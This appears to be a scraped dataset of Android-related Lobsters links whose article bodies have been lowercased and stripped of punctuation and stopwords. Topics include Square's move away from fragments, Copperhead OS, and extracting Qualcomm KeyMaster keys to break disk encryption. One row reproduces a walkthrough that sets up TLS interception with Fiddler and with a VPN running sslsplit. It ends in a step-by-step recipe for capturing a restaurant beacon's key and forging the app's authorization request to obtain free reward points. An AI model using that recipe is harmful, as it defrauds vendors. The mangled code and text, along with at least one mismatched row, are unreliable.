savedinstancestate dialogfragmentshow fragmentmanager tag however restoring activity instance state fragment manager may try recreate instance fragment class using reflection since anonymous class hidden constructor argument reference outer instantiationexception unable instantiate fragment comsquareupmyactivity make sure class name exists public empty constructor publicfragments lesson learneddespite drawback fragment taught u invaluable lesson reapply writing apps single activity interface need use one activity screen split app decoupled widget assemble please make animating lifecycle easy split widget view code controller codethe backstack activity specific notion implement backstack within activitythere need new apis everything needed beginning activity view layout inflatersresponsive ui fragment v custom viewsfragmentslet look fragment basic example list detail uithe headlinesfragment pretty straightforward list public class headlinesfragment extends listfragment onheadlineselectedlistener mcallback public interface onheadlineselectedlistener void onarticleselected int position override public void oncreate bundle savedinstancestate superoncreate savedinstancestate setlistadapter new arrayadapter string getactivity rlayoutfragmentlist ipsumheadlines override public void onattach activity activity superonattach activity mcallback onheadlineselectedlistener activity override public void onlistitemclick listview l view v int position long id mcallbackonarticleselected position getlistview setitemchecked position true interesting listfragmentactivity handle whether detail screen notpublic class listfragmentactivity extends activity implement headlinesfragmentonheadlineselectedlistener override public void oncreate bundle savedinstancestate superoncreate savedinstancestate setcontentview rlayoutnewsarticles findviewbyid ridfragmentcontainer null savedinstancestate null return headlinesfragment firstfragment new headlinesfragment firstfragmentsetarguments getintent getextras getfragmentmanager begintransaction add ridfragmentcontainer firstfragment commit public void onarticleselected int position articlefragment articlefrag articlefragment getfragmentmanager findfragmentbyid ridarticlefragment articlefrag null articlefragupdatearticleview position else articlefragment newfragment new articlefragment bundle args new bundle argsputint articlefragmentargposition position newfragmentsetarguments args getfragmentmanager begintransaction replace ridfragmentcontainer newfragment addtobackstack null commit custom viewslet reimplement similar version code using viewsfirst notion container show item also handle back pressespublic interface container void showitem string item boolean onbackpressed activity assumes always container merely delegate work itpublic class mainactivity extends activity private container container override protected void oncreate bundle savedinstancestate superoncreate savedinstancestate setcontentview rlayoutmainactivity container container findviewbyid ridcontainer public container getcontainer return container override public void onbackpressed boolean handled containeronbackpressed handled finish list also quite trivialpublic class itemlistview extends listview public itemlistview context context attributeset attrs super context attrs override protected void onfinishinflate superonfinishinflate final mylistadapter adapter new mylistadapter setadapter adapter setonitemclicklistener new onitemclicklistener override public void onitemclick adapterview parent view view int position long id string item adaptergetitem position mainactivity activity mainactivity getcontext container container activitygetcontainer containershowitem item meat work loading different xml layout based resource qualifiersreslayoutmainactivityxml comsquareupviewsinglepanecontainer xmlns android http schemasandroidcomapkresandroid android layoutwidth matchparent android layoutheight matchparent android id idcontainer comsquareupviewitemlistview android layoutwidth matchparent android layoutheight matchparent comsquareupviewsinglepanecontainer reslayoutlandmainactivityxml comsquareupviewdualpanecontainer xmlns android http schemasandroidcomapkresandroid android layoutwidth matchparent android layoutheight matchparent android orientation horizontal android id idcontainer comsquareupviewitemlistview android layoutwidth android layoutheight matchparent android layoutweight include layout layoutdetail android layoutwidth android layoutheight matchparent android layoutweight comsquareupviewdualpanecontainer simple implementation container public class dualpanecontainer extends linearlayout implement container private mydetailview detailview public dualpanecontainer context context attributeset attrs super context attrs override protected void onfinishinflate superonfinishinflate detailview mydetailview getchildat public boolean onbackpressed return false override public void showitem string item detailviewsetitem item public class singlepanecontainer extends framelayout implement container private itemlistview listview public singlepanecontainer context context attributeset attrs super context attrs override protected void onfinishinflate superonfinishinflate listview itemlistview getchildat public boolean onbackpressed listviewattached removeviewat addview listview return true return false override public void showitem string item listviewattached removeviewat viewinflate getcontext rlayoutdetail mydetailview detailview mydetailview getchildat detailviewsetitem item private boolean listviewattached return listviewgetparent null hard imagine abstracting container building app way need fragment also code easier understandviews presentersusing custom view work great like isolate business logic dedicated controller call presenter make code much readable facilitates testing mydetailview previous example could look something like public class mydetailview extends linearlayout textview textview detailpresenter presenter public mydetailview context context attributeset attrs super context attrs presenter new detailpresenter override protected void onfinishinflate superonfinishinflate presentersetview textview textview findviewbyid ridtext findviewbyid ridbutton setonclicklistener new onclicklistener override public void onclick view v presenterbuttonclicked public void setitem string item textviewsettext item let look code square register screen editing discountsthe presenter manipulates view high level class editdiscountpresenter public void savediscount editdiscountview view getview string name viewgetname isblank name viewshownamerequiredwarning return isnewdiscount createnewdiscountasync name viewgetamount viewispercentage else updatenewdiscountasync discountid name viewgetamount viewispercentage close writing test presenter breeze test public void cannotsavediscountwithemptyname starteditingloadedpercentagediscount viewgetname thenreturn presentersavediscount verify view shownamerequiredwarning assertthat issavinginbackground isfalse backstack managementmanaging backstack require async transaction released tiny library flow ray ryan already wrote great blog post flowi deep fragment spaghetti escape make fragment shell pull view code custom view class push business logic presenter know interact custom view fragment nearly empty inflating custom view connect presenter public class detailfragment extends fragment override public view oncreateview layoutinflater inflater viewgroup container bundle savedinstancestate return inflaterinflate rlayoutmydetailview container false point eliminate fragmentmigrating away fragment easy went thanks awesome work dimitris koutsogiorgas ray ryanwhat dagger mortar dagger mortar orthogonal fragment used without fragmentsdagger help modularize app graph decoupled component take care wiring therefore make easy extract dependency write single concern objectsmortar work top dagger two main advantage provides simple lifecycle callback injected component allows write singleton presenter destroyed rotation still save state bundle survive process deathit manages dagger subgraphs help tie activity lifecycle effectively let implement notion scope view come presenter dependency created subgraph view go easily destroy scope let garbage collector workconclusionwe used fragment intensively eventually changed mind difficult crash related fragment lifecyclewe need view build responsive ui backstack screen transition
351,Lobsters,android,Android,"Building a Really, Really Small Android App",http://engineering.khanacademy.org/posts/a-really-small-app.htm,building really really small android app,redirecting http blogkhanacademyorgbuildingareallyreallysmallandroidapp,redirecting http blogkhanacademyorgbuildingareallyreallysmallandroidapp
352,Lobsters,android,Android,Android 7.0 Nougat is now rolling out to Nexus devices,http://androidandme.com/2016/08/news/android-7-0-nougat-is-now-rolling-out-to-nexus-devices/,android nougat rolling nexus device,,select amount total data need entire plan example need line gb data would select gb data data slider
353,Lobsters,android,Android,How should I design my Android application?,https://plus.google.com/+DianneHackborn/posts/FXCCYxepsDU,design android application,one account google sign google account,one account google sign google account
354,Lobsters,android,Android,Introducing OpenStreetView,https://www.openstreetmap.org/user/mvexel/diary/39274,introducing openstreetview,minute talk see talk sotm workshop openstreetview component openstreetvieworg open source web site apps apk osm wiki sign detection josm plugin github hello openstreetvieworg twitter upload tool openstreetview,almost year thinking development testing osm team telenav ready present openstreetview osm mapper openstreetview osv free open street level imagery platform designed osm mapper mind officially presented osv osm community state map u minute talk booth gave away crazy little remote controlled car everyone signed car gone quickly almost half people sotm u signed still see talk thanks great sotm u organizer session professionally recorded minute like reading watching video going best way introduced osv use improve osm coming sotm brussels come meet team remote controlled car know attend workshop openstreetview booth sotm u prefer reading read wanted quickly introduce osv component believe choice street level imagery osm course contribute use openstreetview component osv web site openstreetvieworg free open source mobile apps android io specialized map editor plugin josm course back end server support id also planned web site go explore imagery world see leaderboards profile trip see personal stuff course need sign openstreetview account linked osm account need create separate account store sign first time whatever public osm want check go http changing whatever osm id unless want see detail apps free download play app store android also download apk directly apps capture trip optimized driving also work well biking walking scenario apart recording trip also upload trip osv happen automatically enter wifi want finally review local server trip see profile even logged web site log osv apps also osm oauth either way create account osv one thing really specific osv link app dongle car little device read port car almost every car one challenge find dongle read kind diagnostic info car broadcast bluetooth wifi cost around euro list osv compatible one osm wiki ehm small list far different model please add experience osv read speed curve improve accuracy gps signal recorded trip come extrememly handy gps reception poor lost altogether example dense tree cover tunnel dead reckoning provided unit maintain proper alignment road see mean driving tunnel blue gps signal lost red connection osv apps also sign detection built done server client mean detect speed limit sign come real time warn speeding warning feature almost ready one next build update apps frequently josm plugin early beta stage right simply display location image osv server click show image osv panel basic functionality work hope idea even code improve speaking idea already active community reporting issue suggestion github best place let u know bug idea part osv github also source code component mentioned located almost everything osv open source looking make open source like github want create account also write hello openstreetvieworg idea bug report also twitter openstreetview getting facebook instagram kind thing check github see also upload tool existing virb gopro action camera image python script also gui tool drag drop directory onto upload early beta want copy let know two component mentioned yet map editor back end want save separate post write soon screenshot map editor openstreetview think openstreetview choice street level imagery osm almost completely open source also remain full control data upload osv always delete individual photo trip even delete everything remove account moment want part osv longer option web site need email anyone submit request another reason building platform tightly integrated osm obvious way handle user account log osm separate account also deeper integration osm tight map trip osm way link back forth trip image osm way object open kind interesting possibility want spend separate post well would cool would give openstreetview try download app phone sign start capturing tell u experience explore already important please use improve osm note openstreetview project run openstreetmap openstreetmap foundation maintained telenav work sole benefit improving openstreetmap
355,Lobsters,android,Android,How I Hacked an Android App to Get Free Beer,http://breakdev.org/how-i-hacked-an-android-app-to-get-free-beer/,hacked android app get free beer,free beer research estimote detailed documentation uuid major number minor number uuid major minor uuid major minor uuid major minor estimote developer app fiddler middle fiddler tool telerik fiddler option http capture http connects decrypt http traffic tool telerik fiddler option connection allow remote computer connect action export root certificate desktop setting security install sd card tool telerik fiddler option connection cmdexe ipconfig setting wifi modify network advanced option manual certificate pinning authenticationtoken promotedproductsids pin placeid isdonebygesture longitute latitude evil vpn digital ocean alwayson alwayson vpn auto setup script youripsecpsk yourusername yourpassword setting wireless network vpn name type server address secret ipsec identifier ipsec preshared key dns search domain dns server forwarding route setting alwayson note backwardscompatible mode enable sslsplit winscp trip town uuid major minor connecting dot splitparsepy github uuid major minor zzz zzz uuid major minor zzz conclusion fabricatorgeneral certificate pinning twitter mrgretzky kuba breakdevorg edit,recently stumbled upon android app let receive free product various pub restaurant cafe exchange point accumulated previous purchase purchase made let vendor know want receive point app select type product bought eligible type product may beer lunch spent pln depends place order verify purchase vendor need swipe physical beacon device phone enter pin nt work application magically approves transaction granting point example one place offer free beer point purchased beer grant point give free beer every purchased beer place everyone like free beer first thing thought secure purchase verification process exactly magical beacon work importantly way get around application security get taste free beer intentionally nt want mention name application operates home country poland goal give idea flaw similar application may find better secure application retained technical detail application work occasionaly replacing easy identify id private information random data post use fictional name discussed application eatapp way let get started research first thing curious beacon technology used application beacon apparently communicate mobile phone bluetooth application made clear bluetooth need turned beacon swipe work short time found company manufacture beacon saw working eatapp company estimote write beacon technology estimote beacon sticker small wireless sensor attach location object broadcast tiny radio signal smartphone receive interpret unlocking microlocation contextual awareness estimote sdk apps smartphone able understand proximity nearby location object recognizing type ownership approximate location temperature motion use data build new generation magical mobile apps connect real world smart device estimote beacon certified apple compatible well support open beacon format google apparently eatapp application detects restaurant beacon close proximity retrieves identification value device us authorize registration new point eatapp server thankfully estimote released sdk detailed documentation allowed learn information beacon transmits technical information say estimote beacon small computer cortex cpu accompanied accelerometer temperature sensor ghz radio using bluetooth smart also known ble bluetooth low energy also learned beacon broadcast following value uuid commonly represented string eg major number unsigned short integer ie integer ranging reserved value minor number also unsigned short integer like major number great also provide android library make easy application listen beacon broadcast one example code snippet tutorial set beacon listener beaconmanager new beaconmanager getapplicationcontext add beaconmanagerconnect new beaconmanagerservicereadycallback override public void onserviceready beaconmanagerstartmonitoring new region monitored region uuidfromstring look uuid number must constant unique application using major minor number hand describe product eatapp scenario must unique every restaurant whenever application wait vendor swipe beacon phone listens packet specific uuid broadcast packet detected us signal strength value measure beacon proximity android device beacon signal strength indicates device close enough us major minor number packet validation key sent authorization packet eatapp server wondered maximum range beacon able transmit packet application must constantly listening beacon broadcast message even give push notification enter restaurant eatapp beacon present nt search long answer estimote beacon range meter foot signal however diffracted interfered absorbed water including human body real world condition expect range meter wow meter mean theory security key uuid major minor number likely used authorizing reward broadcasted clear air ca nt good knowing beacon broadcast packet received range needed find way receive packet read content would probably take day write android app using estimote sdk thankfully estimote provides estimote developer app debugging troubleshooting problem screenshots could tell gather critical information moment obtaining beacon information would much good without insight application communicates server time set small lab intercepting decrypting http communication mobile phone fiddler middle intercepting mobile phone traffic used window box best free httphttps window proxy inspecting forging new packet know fiddler setting fiddler order enable http interception fiddler open tool telerik fiddler option http make sure capture http connects decrypt http traffic checked also make sure tool telerik fiddler option connection ticked allow remote computer connect option also need export fiddler certificate authority certificate tab click action click export root certificate desktop like put file named fiddlerrootcer desktop root certificate fiddler use generate forged certificate every http connection go proxy obviously fiddler generated root certificate wo nt phone list trusted certificate authority http connection go proxy blocked need import fiddler certificate phone add trusted ca storage first copy fiddlerrootcer sd card phone mean phone open setting security select install sd card find pick fiddler certificate file order import phone trust fiddler proxy able intercept decrypt http traffic need make sure phone window box fiddler running network proceed find port fiddler proxy listens opening tool telerik fiddler option connection checking port box next find local network ip address window box open cmdexe command line prompt type ipconfig able find current ip address section network interface currently using android phone open setting wifi find wireless network connected touch network entry second select modify network dropdown menu dialog tick advanced option scroll proxy setting proxy type need set manual hostname proxy port enter ip address window box fiddler proxy port entered hostname proxy port number everything went fine able see outgoing mobile phone traffic fiddler capturing traffic setup able intercept eatapp traffic application nt implement certificate pinning otherwise would require work done decompile application remove certificate comparison check recompile application opened eatapp opened earn point dialog randomly picked restaurant nt restaurant estimote beacon duh use option enter pin number verify point reward entered random pin number checked intercepted packet fiddler sent request post http accept applicationjson acceptlanguage enus xappversion useragent linux u android contenttype applicationjson contentlength host apieatappcom connection keepalive acceptencoding gzip authenticationtoken point promotedproductsids id id pin placeid isdonebygesture false longitude latitude received reply unprocessable entity server nginx date contenttype applicationjson contentlength connection keepalive vary acceptencoding status unprocessable entity code incorrectargument title incorrect argument pin request complicated parameter sent json data hash value sent form antitampering method account state verification pin sent plaintext parameter pretty self explanatory authenticationtoken account authentication token received server login process value unique every eatapp account wo nt change promotedproductsids array product type id earning point pin pin number entered placeid unique id restaurant want earn point isdonebygesture one mystery believe set true spend point longitute latitude last known gps location value retrieved recently letting server know user exact geographical location could used security measure detect far away restaurant receiving point point wanted try application vulnerable pin bruteforcing possible pin combination unfortunately sending request different pin value started receive following reply server unprocessable entity server nginx date contenttype applicationjson contentlength connection keepalive vary acceptencoding status unprocessable entity code pintoomanyattempts title many pin code attempt header account locked message earning spending point redeeming deal using account locked next minute please let u know mistake unless hundred eatapp account could switch bruteforce process minute account lockdown pretty strong deterrent looking parameter verification request wondered would parameter verification done beacon swipe rather entering pin one idea free point could earned would remotely intercept request packet correct pin value entered restaurant staff intercepting packet remotely would also give opportunity find exact request parameter beacon swipe used instead pin main obstacle performing task intercept request mobile device restaurant great opportunity try setting interception vpn would used connection mobile phone vpn server would intercept decrypt http traffic way fiddler evil vpn first required vps could install vpn software fastest easiest reliable way set linux box vps digital ocean get credit sign link created cheapest debian ram droplet month hour enough need decide vpn protocol wanted use android officially support pptp type vpn protocol learned though although pptp supported considered insecure google nt trust enough enable alwayson feature kind vpn alwayson vpn feature android make sure phone reconnect vpn whenever connection break make sure packet ever sent vpn important wanted absolutely sure every single packet get intercepted decrypted finding good tutorial would teach install vpn debian hard tutorial written debian apparently later version system dependency changed tutorial became outdated finally found perfect way install vpn auto setup script basically server wget http gitiovpnsetup vpnsetupsh nano w vpnsetupsh replace value youripsecpsk yourusername yourpassword sudo sh vpnsetupsh youripsecpsk preshared key phrase eg mysecretpskforvpn yourusername yourpassword username password login vpn done fire forget manner vpn running time set vpn connection phone went setting wireless network vpn added new vpn filled setting follows name vpninterceptor type psk server address vpnserverip secret used ipsec identifier used ipsec preshared key youripsecpsk dns search domain used dns server forwarding route used vpn added clicked tripledot setting button window clicked alwayson option picked newly created vpn connection ran problem android matter hard wanted vpn connect would always show connection error tried another android device worked perfectly knew something wrong latest version android github page auto script mention workaround android marshmellow note android marshmallow user edit etcipsecconf vpn server append ike line add new line immediately indent line two space finished run service ipsec restart nt work removed fix server config file shortly found feature vpn profile setting called backwardscompatible mode set enable bang finally everything started work working vpn time set interception decryption http packet decided use sslsplit software installation easy wget http tar jxvf cd make sudo make install installation script created advanced firewall setting new vpn setup honestly able adjust way allowed redirect httphttps packet sslsplit proxy decided completely purge iptables setting replace iptables config file clean one including setting redirecting packet sslsplit iptables f iptables nat f iptables nat postrouting j masquerade iptables nat postrouting ppp j masquerade iptablessave etciptablesrules packet forwarding already enabled reenabled every boot vpn auto setup script order sure could run echo next prepared directory structure sslsplit log file created sslsplit root certificate used generating forged http certificate way fiddler mkdir sslsplit mkdir sslsplitcerts mkdir sslsplitlogs cd sslsplitcerts openssl genrsa cakey openssl req new day key cakey cacrt download sslsplitcertscacrt root certificate vps copy phone sd card import trusted certificate authority way android phone would allow forged certificate generated sslsplit accepted could easily download cacrt file vps via ssh protocol window using winscp order easily turn httphttps interception server decided create two small shell script sslsplit directory put root rootsslsplitstartsh binbash iptablesrestore etciptablesrules iptables nat prerouting ppp p tcp dport j redirect toports iptables nat prerouting ppp p tcp dport j redirect toports sslsplit l rootsslsplitconnectionslog j rootsslsplit f rootsslsplitlogs k certscakey c certscacrt ssl tcp rootsslsplitstopsh binbash killall sslsplit iptablesrestore etciptablesrules whenever wanted start intercepting packet run startsh wanted stop stopsh simple sslsplit configured run daemon would log raw packet separate file rootsslsplitlogs directory logging feature sslsplit perfect nt fully decode saved http packet nt group packet requestreply order put several packet one file sent exact second need fine later describe overcame http decoding issue vpn setup done http interception place finally able drive town eat something live packet capturing trip town visited three place ordered food one checkout asked vendor register eatapp point product point phone time connected interception vpn authorization packet logged server sslsplit found location permission turned beacon proximity feature would nt work thus two place staff use pin authorization retrieved two packet correct pin value first two place third place able capture beacon authorization packet enabled location permission app finally opportunity check official estimote developer app supposed detect nearby beacon broadcast retrieve broadcasted uuid major minor turned theory correct still confirm home broadcasted authorization key really used authorization packet analyzing sslsplit log file connecting dot downloaded sslsplit log file server issue sslsplit log http packet raw form meaning transferencoding chunked packet compressed gzip packet wo nt logged decoded plaintext form released small script supposed decode sslsplit packet clear text form please note script us quite buggy httpparser library decided use parsing http packet simple need though good enough find splitparsepy github usage pip install httpparser python splitparsepy sslsplitlogsdir outputdir quickly found request packet authorization data sent beacon swiped phone post accept applicationjson acceptlanguage engb xappversion useragent linux u android contenttype applicationjson contentlength host apieatappcom connection keepalive acceptencoding gzip authenticationtoken latitude longitude point isdonebygesture false mainbeacon major minor uuid placeid promotedproductsids id id id jackpot confirmed uuid major minor number exactly request authorization packet detected live estimote developer app meant theory correct verification key constantly broadcasted air every eatapp supported restaurant summarize stepbystep guide get free eatapp point restaurant zzz walk restaurant zzz open estimote developer app detect closest nearby beacon save screenshot visible uuid major minor value go home set breakpoint fiddler intercept eatapp packet user path get request phone select zzz restaurant set eatapp await pin authorization earned point enter pin modify intercepted packet fiddler removing pin nnnn entry replacing valid mainbeacon content containing beacon key captured estimote app let modified packet eatapp server enjoy free point course would much better write tool directly communicate application server api implementing proper location spoofing method described quicker easier testing purpose conclusion broadcasting authorization key publicly air never good idea list thing could done improve eatapp security send hash value account current state additional request parameter point every restaurant account name last sent gps location etc server would verify hash correct authorize request finding hash parameter formed would possible without disassembling reverse engineering application code would add additional difficulty order make reverse engineering harder application code obfuscated additional hash verification parameter implemented would greatly increase difficulty reverse engineering application code fabricatorgeneral mentioned comment section possible enable secure uuid feature estimote beacon would broadcast beacon key encrypted form way application correct api key would able decrypt bypassing would require writing custom mobile application implementing estimote sdk would listen broadcast decrypting application api key would retrieved first reverse engineering application code certificate pinning implemented make harder intercept http connection using forged certificate security feature could also bypassed would involve reverse engineering application finding certificate verification check done removing recompiling application sure possible estimote beacon would good provide restaurant second beacon would used authorizing transaction maximum broadcast range half meter never trust client device maximum security client device send reward request server without authorization key afterwards server would send authorization request vendor dedicated tablet behind counter requesting authorize point reward proper key beacon swiping entering pin would done vendor device thus making impossible client intercept request could later use create forged packet strongly hope learned something new today found post entertaining question want send feedback want contact reason find twitter mrgretzky contact directly via email kuba breakdevorg till next time time enjoy spoil hard work cheer edit added two new method securing application conclusion section
356,Lobsters,android,Android,Copperhead OS: The startup that wants to solve Android’s woeful security,http://arstechnica.com/security/2016/08/copperhead-os-fix-android-security/,copperhead o startup want solve android woeful security,copperhead o grsecurity pax copperhead patch trail bit enlarge deal devil human right issue requires fde hardware support nexus thanks motorola financial incentive,guardian project startup shoestring budget working clean android security mess even demonstrated result secure android phone failed raising question google willingness address widespread vulnerability exist world popular mobile operating system copperhead probably exciting thing happening world android security today chris soghoian principal technologist speech privacy technology project american civil liberty union tell ar enigma copperhead even exist company large google much money google respected security anything left copperhead copperhead o twoman team based toronto ship hardened version android aim integrate grsecurity pax distribution o also includes numerous security enhancement including port openbsd malloc implementation compiler hardening enhanced selinux policy function pointer protection libc unfortunately security nut copperhead currently support nexus device google android security team accepted many copperhead patch upstream android open source project aosp code base majority copperhead security enhancement likely ever reach beyond small growing user base performance tradeoff compatibility issue dan guido ceo trail bit also puzzled vulnerability gap stock android o copperhead point could said apple io imagine world copperhead io nt even know change tell ar apple team almost always picked secure path go found way overcome performance user experience issue billion people around world rely android secure digital life number going grow get even garbage fire enlarge general outline copperhead main feature deal devil google deal devil market share say soghoian described current parlous state android security human right issue giving original equipment manufacturer oems wireless carrier control enduser experience google allowed handset manufacturer find way differentiate product wireless carrier disable feature thought would threaten business model result google power samsung motorola manufacture sell android solely android license access google play store aosp code base licensed apache kernel us mean nothing stopping oems deploying stock android different name would also mean losing access play store give google significant leverage oems mean absolute competitor willing forgo android trademark offer customer access app store amazon done walk away negotiating table little consequence soghoian think google nt trying hard company could point demand oems implement default fulldisk encryption part android play service licence term company currently requires fde hardware support extending requirement lowerend android manufacturer might scare nontrivial fraction would hurt google bottom line advertising company important thing remember say google go nuclear cut oem google play store gmail google map youtube google nt hurting oem customer also hurting every phone nt youtube google mail search phone nt making money google add copperhead part business surveilling user order display targeted advertising free optimise android security first challenge find handset support offered regular security small ask nexus thanks oems instance motorola ship monthly security update available aosp business model handset manufacturer end sale point financial incentive maintain device next three year copperhead chooses focus optimising security believe secure handset currently available nexus device whose software hardware google control directly receive prompt monthly security update starting nexus pretty good starting point copperhead daniel micay explains significantly improving security operating system making lot underthehood change exploit mitigation make harder exploit vulnerability micay goal port grsecurity pax patch android linux kernel would dramatically improve security android handset goal stymied hardware even google appears capable resolving least
358,Lobsters,android,Android,Protecting Android with more Linux kernel defenses,https://security.googleblog.com/2016/07/protecting-android-with-more-linux.html,protecting android linux kernel defense,security androidcom,due effort others expect security kernel continue improving always appreciate feedback work welcome suggestion improve android contact u security androidcom
359,Lobsters,android,Android,Salesforce will only support Nexus and Samsung Galaxy phones to avoid Android fragmentation,http://www.recode.net/2016/7/18/12217580/salesforce-support-nexus-samsung-galaxy-android-fragmentation,salesforce support nexus samsung galaxy phone avoid android fragmentation,support document bypass development hell android bought one firm,one big challenge android app developer fact many different phone using variety version google operating system often mean lot time money spent testing supporting android apple io android running majority smartphones large developer salesforce taking rather unusual stance effort avoid problem starting update app later year company offer support app using certain google nexus samsung galaxy device company declined go detail reasoning confirmed support document looking maximize development resource due wide array available android device targeting support select number android device continue improving overall android user experience company said support document salesforce approach take hold could offer boost samsung already market leader android device especially among business user oculus cto john carmack cited similar rationale explaining virtual reality maker partnered samsung gear vr bypass development hell android fragmentation within android world take many form addition hardware diversity android phone often slow get software update carrier forcing developer make sure apps run multiple version operating system cottage industry testing house cropped android developer test apps range leading device rather buy maintain hundred thousand different model google even bought one firm appurify back google executive noted recent io developer conference issue remain top concern past effort ensure prompt software update done little lessen problem salesforce plan support samsung galaxy samsung galaxy note google nexus google nexus well two samsung tablet galaxy note tab using unsupported android device still able install new salesforce apps company provide support device fix bug arise article originally appeared recodenet
361,Lobsters,android,Android,Extracting Qualcomm's KeyMaster Keys - Breaking Android Full Disk Encryption,http://bits-please.blogspot.com/2016/06/extracting-qualcomms-keymaster-keys.html,extracting qualcomm keymaster key breaking android full disk encryption,previous blog post setting stage apple v fbi san bernardino terrorist attack derived user password bound hardware device even apple extract device much harder dan guido superb post technical aspect apple v fbi matthew green great overview apple fde io security guide android full disk encryption dmcrypt official documentation android fde nikolay elenkov blog android exploration bind key device hardware hardwarebacked keystore keymaster reversing qualcomm keymaster reverseengineer qsee trustlets android source code supplied header file encrypted directly available trustzone software constant conclusion derived shk directly available trustzone modified extracted software extracting keymaster key codeexecution within qsee privilege escalation qsee trustzone kernel previous blog post previous method shared nonsecure world putting together code http githubcomlaginimainebextractkeymaster http githubcomlaginimainebandroidfdebruteforce hashcat oclhashcat final thought,covering trustzone kernel vulnerability exploit previous blog post thought time might interesting explore implication codeexecution within trustzone kernel blog post demonstrate trustzone kernel codeexecution used effectively break android full disk encryption fde scheme also see inherent issue stemming design android fde scheme even without trustzone vulnerability contact qualcomm regarding issue prior release post let review blog post always helpful fast respond unfortunately seems though fixing issue simple might require hardware change nt interested technical detail want read conclusion feel free jump right conclusion section vein interested code jump directly code section update made factual mistake original blog post corrected post apparently qualcomm able sign firmware image oems coerced create custom trustzone image apologise mistake without ado let get setting stage couple month ago highlypublicised case apple v fbi brought attention topic privacy especially context mobile device following san bernardino terrorist attack fbi seized mobile phone belonging shooter syed farook intent search additional evidence lead related ongoing investigation however despite possession device fbi unable unlock phone access content may sound puzzling first surely fbi access phone could extract user data stored using forensic tool well answer simple see device question iphone running io may well know starting io apple automatically enabled full disk encryption fde using encryption key derived user password order access data device fbi would crack encryption barring error cryptographic design would probably achieved cracking user password bruteforce password sound like completely valid approach especially since user notoriously bad choosing strong password even come mobile device however engineer apple oblivious concern designing fde scheme order try mitigate kind attack designed encryption scheme generated encryption key bound hardware device short device immutable unique key called uid randomly generated fused device hardware factory key stored way completely prevents access using software firmware set key aes engine meaning even apple extract device set devicespecific key used combination provided user password order generate resulting encryption key used protect data device effectively tangle password uid key apple fde kdf binding encryption key device hardware allows apple make job much harder wouldbe attacker essentially force attacker use device cracking attempt turn allows apple introduce whole array defence would make cracking attempt device unattractive starter keyderivation function shown engineered way would take substantial amount time compute device specifically apple chose function parameter single key derivation would take approximately millisecond delay would make cracking short alphanumeric password slow week alphanumeric password cracking longer password completely infeasible order mitigate bruteforce attack device apple also introduced incrementally increasingly delay subsequent password guess iphone delay facilitated completely using software lastly apple allowed option completely erase information stored device failed password attempt configuration coupled softwareinduced delay made cracking password device rather infeasible well mind lot reasonable fbi unable crack device encryption able extract uid key could used much specialized hardware needed order rapidly guess many password would probably allow eventually guess correct password however seeing uid key extracted mean software firmware option ruled cracking password device softwareinduced delay password attempt possibility obliterating data device made option rather unattractive unless could bypass software protection however story get rather irrelevant blog post keep like read check dan guido superb post technical aspect apple v fbi matthew green great overview apple fde better yet io security guide going back issue hand see apple cleverly designed fde scheme order make difficult crack android mature operating system one lag behind fact android also offered full disk encryption enabled default since android android fde scheme fare let find android full disk encryption starting android android device automatically protect user information enabling full disk encryption android fde based linux kernel subsystem called dmcrypt widely deployed researched bat already good news dmcrypt withstood test time seems like great candidate fde implementation however encryption scheme may robust system strong key used encrypt information additionally mobile device tend cause user choose poorer password general mean key derivation function hugely important setting encryption key generated process described great detail official documentation android fde even greater detail nikolay elenkov blog android exploration short device generates randomlychosen master key refer device encryption key dek randomlychosen salt dek protected using elaborate key derivation scheme us user provided unlock credential pinpasswordpattern order derive key ultimately encrypt dek encrypted dek stored device inside special unencrypted structure called crypto footer encrypted disk decrypted simply taking user provided credential passing key derivation function using resulting key decrypt stored dek dek decrypted used decrypt user information however get interesting like apple fde scheme android fde seek prevent bruteforce cracking attack device especially naturally order prevent ondevice cracking attack android introduced delay decryption attempt option wipe user information subsequent failed decryption attempt like io preventing offdevice bruteforce attack well achieved introducing step key derivation scheme bind key device hardware binding performed using android hardwarebacked keystore keymaster keymaster keymaster module intended assure protection cryptographic key generated application order guarantee protection tampered keymaster module run trusted execution environment tee completely separate android operating system keeping trustzone terminology refer android operating system nonsecure world tee secure world put simply keymaster module used generate encryption key perform cryptographic operation without ever revealing key nonsecure world key generated keymaster module encrypted using hardwarebacked encryption key returned nonsecure world whenever nonsecure world wish perform operation using generated key must supply encrypted key blob keymaster module keymaster module decrypt stored key use perform wanted cryptographic operation finally return result nonsecure world since done without ever revealing cryptographic key used protect key blob nonsecure world mean cryptographic operation performed using key blob must handled keymaster module directly device mind let see exactly keymaster used android fde scheme taking closer look hardwarebound key derivation function used android fde scheme short schematic detailing kdf based similar schematic created nikolay elenkov android fde kdf see order bind kdf hardware device additional field stored crypto footer keymastergenerated key blob key blob contains keymasterencrypted private key used sign encryption key intermediate step kdf thus requiring use keymaster module order produce intermediate key used decrypt dek decryption attempt moreover crypto footer also contains additional field nt serve direct purpose decryption process value returned running scrypt final intermediate key value referred scryptedintermediatekey scrypted ik diagram used verify validity supplied fde password case error decryption process important since allows android know given encryption key valid disk faulty however knowing value still nt help attacker reverse retrieve still ca nt used help attacker aiming guess password device seen android fde kdf bound hardware device intermediate keymaster signature secure keymaster module key blob protected unfortunately hard say implementation keymaster module provided soc oems completely undocumented essentially blackbox could try rely official android documentation state keymaster module offer opportunity android device provide hardwarebacked strong security service surely enough pondering pondering reversing qualcomm keymaster seen previous blog post qualcomm provides trusted execution environment called qsee qualcomm secure execution environment qsee environment allows small application called trustlets execute dedicated secured processor within secure world trustzone one qsee trustlet running secure world keymaster application already seen reverseengineer qsee trustlets simply apply technique order reverse engineer keymaster module gain insight inner working first let take look android source code used interact keymaster application reveals trustlet support four different command interested protection guarding generated key blob let take look keymastersigndata command command receives previously encrypted key blob somehow performs operation using encapsulated cryptographic key ergo reverseengineering function able deduce encrypted key blob decapsulated keymaster module command signature exactly imagine user provides encrypted key blob signature parameter address length data signed trustlet decapsulates key calculates signature writes shared result buffer luck would key blob structure actually defined supplied header file look like okay pretty interesting first see key blob contains unencrypted modulus public exponent generated rsa key however private exponent seems encrypted way whole key blob authenticity verified using hmac encryption key stored hmac key stored reverseengineer keymaster module find let take look keymaster trustlet implementation keymastersigndata command function start boilerplate validation order make sure supplied parameter valid skip since nt focus post verifying parameter function mapsin usersupplied data buffer accessible secure world eventually reach core logic function okay definitely getting somewhere first see code call function taken liberty calling getsomekindofbuffer store result variable immediately retrieving buffer code call qseehmac function order calculate hmac first byte usersupplied key blob make sense since size key blob structure seen exactly byte without hmac field wait already seen qseehmac function widevine application specifically know receives following argument variable called passed fourth argument qseehmac mean one thing fact hmac key already see used function 